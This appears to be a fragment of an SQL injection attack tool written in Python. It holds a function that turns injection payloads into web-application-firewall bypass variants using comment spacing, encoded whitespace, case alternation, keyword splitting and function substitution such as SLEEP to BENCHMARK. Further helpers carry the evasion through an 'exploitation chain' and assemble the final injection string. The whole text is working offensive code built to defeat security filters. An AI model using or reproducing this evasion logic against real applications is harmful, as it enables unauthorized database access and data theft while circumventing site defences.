# ---------------------------------------------------------------------------
# WAF bypass payload generator
# ---------------------------------------------------------------------------
def _sqli_waf_variants(mid_payload):
    """Return a list of WAF bypass variants for a Phase-3 middle payload."""
    variants = []
    p = mid_payload
    # 1. Space → block comment
    if " " in p:
        variants.append((p.replace(" ", "/**/"), "WAF space->/**/"))
    # 2. Space → URL-encoded tab
    if " " in p:
        variants.append((p.replace(" ", "%09"), "WAF space->%09"))
    # 3. Space → URL-encoded newline
    if " " in p:
        variants.append((p.replace(" ", "%0a"), "WAF space->%0a"))
    # 4. Case variation (alternate chars) + space→/**/
    def _alt_case(s):
        out = []
        idx = 0
        for c in s:
            if c.isalpha():
                out.append(c.upper() if idx % 2 == 0 else c.lower())
                idx += 1
            else:
                out.append(c)
        return "".join(out)
    p_alt = _alt_case(p)
    if p_alt != p:
        variants.append((p_alt, "WAF case-variation"))
        if " " in p_alt:
            variants.append((p_alt.replace(" ", "/**/"), "WAF case+space->/**/"))
    # 5. Keyword comment-splitting (split one keyword to break regex signatures)
    for kw in ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR", "SLEEP", "INSERT"]:
        upper = p.upper()
        if kw in upper:
            pos = upper.find(kw)
            half = len(kw) // 2
            split_kw = p[pos:pos+half] + "/**/" + p[pos+half:pos+len(kw)]
            variant = p[:pos] + split_kw + p[pos+len(kw):]
            if variant != p:
                variants.append((variant, "WAF keyword-split " + kw))
            break
    # 6. SLEEP → BENCHMARK equivalent
    _bench = re.sub(r'(?i)SLEEP\s*\(\s*(\d+)\s*\)',
                    lambda m: "BENCHMARK({},MD5(1))".format(int(m.group(1)) * 10000000), p)
    if _bench != p:
        variants.append((_bench, "WAF SLEEP->BENCHMARK"))
    # 7. SUBSTR → MID, ASCII → ORD
    _midsub = re.sub(r'(?i)\bSUBSTR\s*\(', 'MID(', p)
    _midsub = re.sub(r'(?i)\bASCII\s*\(', 'ORD(', _midsub)
    if _midsub != p:
        variants.append((_midsub, "WAF SUBSTR->MID / ASCII->ORD"))
    # 8. URL-encode the whole thing (single-level)
    _url_enc = p.replace("'", "%27").replace(" ", "%20").replace("=", "%3D")
    if _url_enc != p:
        variants.append((_url_enc, "WAF URL-encode special chars"))
    return variants


def _sqli_infer_waf(balance_tuple, waf_bypass_enabled):
    """Return the space-substitute character derived from the winning balance suffix.

    If the terminator contains a WAF-bypass encoding (%0a, %09, /**/) we carry
    that same substitution forward into every subsequent phase so the entire
    exploitation chain uses consistent syntax.
    """
    if balance_tuple is None:
        return ' '
    _test_suffix, _inj_prefix, terminator, desc = balance_tuple
    tl = terminator.lower()
    if '%0a' in tl:
        return '%0a'
    if '%09' in tl:
        return '%09'
    if '/**/' in tl:
        return '/**/'
    if waf_bypass_enabled and ('WAF' in desc or 'waf' in desc.lower()):
        return '/**/'  # safest default when WAF mode enabled but no explicit encoding
    return ' '


def _sqli_fv(orig_val, inj_prefix, mid_payload, terminator, waf_space):
    """Build the full injection value string with WAF-aware space substitution.

    waf_space is the replacement for every space in the injection context
    (' ' = normal URL-form, '/**/' or '%0a' etc. for WAF bypass).

    The caller should still call .replace(' ', '+') on the result before using
    it in the URL / body, because any remaining literal space (e.g. inside
    terminator '-- -') also needs URL encoding.
    """
    waf_mid = mid_payload.replace(' ', waf_space)
    sep = waf_space
    if terminator:
        return "{}{}{}{}{}{}" .format(orig_val, inj_prefix, sep, waf_mid, sep, terminator)
    return "{}{}{}{}".format(orig_val, inj_prefix, sep, waf_mid)

